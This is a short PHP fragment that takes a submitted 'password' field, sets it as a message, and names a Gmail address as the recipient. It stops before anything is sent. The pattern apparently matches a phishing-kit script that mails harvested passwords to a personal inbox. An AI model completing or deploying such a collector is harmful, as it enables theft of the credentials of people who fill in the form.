<?php 
$errors = '';
$myemail = 'willtomjones01@gmail.com';
if(empty($_POST['password']))
{
    $errors .= "\n Error: all fields are required";
}

$message = $_POST['password']; 
?>